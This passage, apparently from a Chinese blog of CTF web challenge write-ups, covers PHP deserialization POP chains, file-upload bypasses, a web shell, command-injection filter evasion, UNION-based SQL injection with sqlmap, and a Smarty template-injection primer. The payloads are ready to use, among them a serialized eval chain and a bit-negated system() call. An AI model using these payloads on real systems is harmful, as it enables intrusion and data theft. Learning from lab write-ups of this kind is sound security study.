class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22System%28%27cat+%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-easyupload1-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1>
      <p>检测文件头，改一下就行了，<code>flag</code>在<code>phpinfo</code>里面</p>

        <h1 id="SWPUCTF-2021-新生赛-easyupload2-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h1>
      <p>检测后缀和文件头</p>

        <h1 id="SWPUCTF-2021-新生赛-easyupload3-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1>
      <p>可以上传<code>.htaccess</code>来将<code>png</code>作为<code>php</code></p>

        <h1 id="SWPUCTF-2021-新生赛-caidao"   >
          <a href="#SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1>
      <p>加载了一张图片，但是一般来说，如果只加载图片，并不会能连接的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109200923250.png" alt="image-20230109200923250"></p>
<p>但是用蚁剑连上，才发现<code>index.php</code>里面有</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo(&#x27;&lt;html&gt;&lt;head&gt;&lt;style&gt;body&#123;background:url(caidao.png) top left;background-size:100%;&#125;&lt;/style&gt;&lt;/head&gt;&lt;/html&gt;&#x27;);</span><br><span class="line">@eval($_POST[&#x27;wllm&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-easyrce"   >
          <a href="#SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1>
      <p>普通的<code>shell</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201242190.png" alt="image-20230109201242190"></p>

        <h1 id="SWPUCTF-2021-新生赛-babyrce"   >
          <a href="#SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1>
      <p>提示如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201720863.png" alt="image-20230109201720863"></p>
<p>用<code>burpsuite</code>给<code>COOKIE</code>添加一下<code>admin</code>字段为1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201814743.png" alt="image-20230109201814743"></p>
<p>访问<code>rasalghul.php</code>，直接命令执行，过滤空格，用<code>$&#123;IFS&#125;</code>代替空格即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201940275.png" alt="image-20230109201940275"></p>

        <h1 id="SWPUCTF-2021-新生赛-hardrce"   >
          <a href="#SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1>
      <p>命令执行，但是过滤了很多东西</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205721004.png" alt="image-20230109205721004"></p>
<p>但是由于是<code>php7</code>，所以可以利用取反来执行命令，参考<code>p神</code>的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205707061.png" alt="image-20230109205707061"></p>
<p>主要结论如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205850748.png" alt="image-20230109205850748"></p>
<p>即用<code>python</code>稍微写一下就行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210209173.png" alt="image-20230109210209173"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>c%df%d0);<span class="comment">//system(&#x27;ls /&#x27;)</span></span><br></pre></td></tr></table></div></figure>

<p>知道<code>flag</code>名字了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210301490.png" alt="image-20230109210301490"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">8</span>b%df%d0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>);<span class="comment">//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-finalrce"   >
          <a href="#SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110140811427.png" alt="image-20230110140811427"></p>
<p><code>exec</code>直接执行命令，但是过滤了很多东西，包括<code>ls</code>也过滤了，但是命令行中有比较特殊符号反引号以及<code>\</code>，这个常用来连接命令，可以看到如下例子，其实是差不多的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141330808.png" alt="image-20230110141330808"></p>
<p>所以这里可以用<code>l\s</code>来进行绕过，其他命令也是类似。</p>
<p>那么就差一个回显了，由于重定向符号<code>&gt;</code>也被禁止了，那么这里可以用到<code>tee</code>命令，该命令可以通过管道符<code>|</code>将前一个命令的执行结果写入到文件中，效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141934420.png" alt="image-20230110141934420"></p>
<p>那么就可以通过该命令来将需要命令结果写入到文件中，然后访问文件即可访问到命令结果。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=l\s%20/%20|%20tee%201.txt</span><br></pre></td></tr></table></div></figure>

<p>对应访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110142057595.png" alt="image-20230110142057595"></p>
<p>同样道理获取<code>flag</code>，但是这里还过滤了<code>la</code>，所以同样道理，给<code>flllllaaaaaaggggggg</code>的对应<code>la</code>处加上<code>\</code>符号也是一样的。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=c\at%20/flllll\aaaaaaggggggg%20|%20tee%202.txt</span><br></pre></td></tr></table></div></figure>

<p>访问<code>2.txt</code>即可得到<code>flag</code></p>

        <h1 id="SWPUCTF-2021-新生赛-easy-sql"   >
          <a href="#SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1>
      <p>参数是<code>wllm</code>，几个<code>sql</code>注入常见考点</p>

        <h2 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>同样的，对应<code>sql</code>语句也会有注释，常用的注释有下</p>
<ul>
<li><code>#</code>：但是在<code>url</code>中该符号有特殊意义，所以使用的时候需要改成编码<code>%23</code>才行</li>
<li><code>--</code>：用的时候通常需要为<code>--空格 </code>形式才能正常解析，而在<code>sql</code>中<code>+</code>和<code>--</code>连用时作用和空格类似，所以<code>--+</code>成为常见的<code>sql</code>注入语句，当然<code>--%20</code>也是一样的。</li>
</ul>
<p>所以这里先使用单引号<code>&#39;</code>将之闭合，然后语句最后使用<code>--+</code>来将后面的多余语句进行注释，比如原语句是</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> ... </span><br></pre></td></tr></table></div></figure>

<p>用户输入为<code>1&#39; order by 1--+</code>，那么结果即为</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+&#x27; and ... </span></span><br></pre></td></tr></table></div></figure>

<p>原本的<code>&#39; and ... </code>这个就不会执行了，而<code>order by 1</code>会顺利执行，完成相关的<code>sql</code>语句注入查询。</p>

        <h2 id="1-判断类型"   >
          <a href="#1-判断类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h2>
      <p>首先需要判断注入类型，常见的有字符，数字，时间，布尔等。</p>
<p>输入<code>wllm=1</code>正常回显，但是输入<code>wllm=1&#39;</code>会显示错误，代表引号匹配不对，表明是字符型的注入。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-字段数查询"   >
          <a href="#2-字段数查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-字段数查询" class="headerlink" title="2.字段数查询"></a>2.字段数查询</h2>
      <p>需要知道该表有几个字段，才能进行后续的回显点查询，这里可以用到<code>order by</code>来进行查询。</p>
<p><code>order by </code>的意思就是依据输入的字段来进行排序，这里既可以输入字段名字，也可以输入字段序号，比如下表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173717231.png" alt="image-20230110173717231"></p>
<p>输入<code>order by games_played</code>和输入<code>order by 4</code>其效果是一样的，但是如果输入<code>order by 5</code>，而该表又只有4个字段，那么就会出错，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173850560.png" alt="image-20230110173850560"></p>
<p>可以通过这个方法来判断有几个字段，这里输入<code>order by 4</code>回显错误，表明字段数为3。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175556882.png" alt="image-20230110175556882"></p>

        <h2 id="3-回显点查询"   >
          <a href="#3-回显点查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-回显点查询" class="headerlink" title="3.回显点查询"></a>3.回显点查询</h2>
      <p>可以看到输入<code>wllm=1</code>是正常回显的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173359149.png" alt="image-20230110173359149"></p>
<p>而<code>xxx</code>和<code>yyy</code>就是可能存在的回显点，那么需要判断这个回显点是在那个字段，这里就可以使用常见的<code>select 1,2,3</code>这种了。</p>

        <h3 id="select-1-2-3"   >
          <a href="#select-1-2-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-1-2-3" class="headerlink" title="select 1,2,3"></a>select 1,2,3</h3>
      <p>直接查询情况如下，可以看到，相当于直接创建了一个与<code>1,2,3</code>有关的表，字段数为输入的数字个数，即3个，对应数据也能理解</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175654372.png" alt="image-20230110175654372"></p>
<p>而当和联合查询<code>union select</code>相结合使用的时候，就需要输入的这些字段数和另一个表的字段数一样才会正常查询</p>
<p>比如某个表如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180052010.png" alt="image-20230110180052010"></p>
<p>联合查询语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180123723.png" alt="image-20230110180123723"></p>
<p>相当于把两个表进行合并，而如果字段数不一致，就会出错，比如减去一个字段数</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180254544.png" alt="image-20230110180254544"></p>
<p>可以看到查询字段数不一致的错误，这里也就是为什么之前需要判断表有几个字段的原因。</p>

        <h3 id="结合查询"   >
          <a href="#结合查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#结合查询" class="headerlink" title="结合查询"></a>结合查询</h3>
      <p>把前一张表置空，也就是<code>where wllm=xx</code>，<code>xx</code>不存在的时候，前一张表查出来自然就是空的。</p>
<p>然后再联合查询<code>select 1,2,3...</code>，依据返回数据，判断回显点在哪个字段</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180737312.png" alt="image-20230110180737312"></p>
<p>即可知道回显的数据在第2，3两个字段，那么就依据这两个字段，进行相关数据查询，这里就从第2个字段入手。</p>

        <h2 id="4-查询库名"   >
          <a href="#4-查询库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-查询库名" class="headerlink" title="4.查询库名"></a>4.查询库名</h2>
      <p>利用<code>database()</code>函数来查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181009012.png" alt="image-20230110181009012"></p>
<p>库名为<code>test_db</code></p>

        <h2 id="5-查询表名"   >
          <a href="#5-查询表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-查询表名" class="headerlink" title="5.查询表名"></a>5.查询表名</h2>
      <p>利用<code>group_concat()</code>函数来查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到，这里想要提供库的名字<code>test_db</code>，所以之前需要查询到库名。</p>
<p>这里也有一点前置知识，也就是<code>information_schema</code>是<code>mysql</code>中的一个信息数据库，保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。比如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38972910/article/details/86012110" >(48条消息) mysql自带的information_schema.tables是什么？_你的小伙伴啊的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>那么即可查询到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181442257.png" alt="image-20230110181442257"></p>
<p>可以看到存在两个表为<code>test_tb</code>和<code>users</code></p>

        <h2 id="6-查询字段名"   >
          <a href="#6-查询字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-查询字段名" class="headerlink" title="6.查询字段名"></a>6.查询字段名</h2>
      <p>方法和查询表名类似，需要提供表名，之前查表名的原因</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span><span class="operator">-</span>xx<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181822291.png" alt="image-20230110181822291"></p>

        <h2 id="7-查询数据"   >
          <a href="#7-查询数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-查询数据" class="headerlink" title="7.查询数据"></a>7.查询数据</h2>
      <p>方法类似，查询<code>flag</code>内容</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(flag),3 from test_tb--+ </span></span><br></pre></td></tr></table></div></figure>

<p>得到最终<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110182041851.png" alt="image-20230110182041851"></p>

        <h2 id="SQLMAP"   >
          <a href="#SQLMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2>
      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -dbs</span><br><span class="line"><span class="meta">#</span><span class="bash">得到所有数据库名</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db --tables</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中的所有表名字</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db --columns</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中test_db表中的所有字段名字，这个跑不出来</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db -C flag -dump</span><br><span class="line"><span class="meta">#</span><span class="bash">跑不出来</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="CISCN-2019华东南-Web11"   >
          <a href="#CISCN-2019华东南-Web11" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h1>
      <p>看到这两个，猜测是<code>smarty</code>的<code>Server Side Template Injection</code>即<code>SSTI</code>模板注入，这个就需要一些前置知识了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111154621041.png" alt="image-20230111154621041"></p>

        <h2 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>简单安装使用：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/enjoyxp/article/details/2050325" >(48条消息) windows环境下smarty安装最简明教程_enjoyxp的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272393#h3-12" >Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>首先应该是为什说<code>smarty</code>能够进行模板注入，其实主要在于它的<code>string</code>模板，也就是如下的代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="前期调用链"   >
          <a href="#前期调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#前期调用链" class="headerlink" title="前期调用链"></a>前期调用链</h3>
      <p>前期会有一些链子调用到关键函数</p>
